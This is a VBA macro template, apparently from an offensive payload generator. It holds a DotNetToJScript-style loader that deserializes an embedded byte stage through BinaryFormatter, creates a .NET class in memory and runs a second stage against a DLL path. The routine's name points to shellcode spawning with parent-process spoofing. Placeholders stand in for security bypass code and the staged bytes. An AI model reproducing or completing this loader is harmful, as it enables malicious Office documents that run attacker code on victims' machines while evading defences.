{{bypassCode}}

{{moduleCode}}

Sub dotnettojscript_ppidShellcodeSpawn()
    
	Dim lpStage_1() As Byte
	Dim lpStage_2() As Byte
	
	Dim objBinaryFormatter As Object
    Dim objMemoryStream_1 As Object
	Dim objDeserialize_1 As Object
	Dim objArrayList As Object
	Dim objSurrogateSelector As Object
	Dim objTestClass As Object
	
	Dim szClassName As String
	Dim szDllPath As String
	
	Dim i
	
    On Error Resume Next
	
    {{bypassCalls}}
    
	{{moduleCalls}}
    
    szClassName = "TestClass"
	szDllPath = {{binaryname}}

	Set objMemoryStream_1 = CreateObject("System.IO.MemoryStream")
    Set objBinaryFormatter = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
	
    lpStage_1 = getStage_1()
	
	For Each i In lpStage_1
		objMemoryStream_1.WriteByte i
    Next i

    objMemoryStream_1.Position = 0
	
	lpStage_2 = getStage_2()
	
	Set objArrayList = CreateObject("System.Collections.ArrayList")
	Set objSurrogateSelector = objBinaryFormatter.SurrogateSelector
    
    Set objDeserialize_1 = objBinaryFormatter.Deserialize_2(objMemoryStream_1)
    objArrayList.Add objSurrogateSelector

    Set objTestClass = objDeserialize_1.DynamicInvoke(objArrayList.ToArray()).CreateInstance(szClassName)
	objTestClass.RunClass szDllPath, StrConv(lpStage_2(), vbUnicode)

End Sub


{{getStage_1}}


{{getStage_2}}

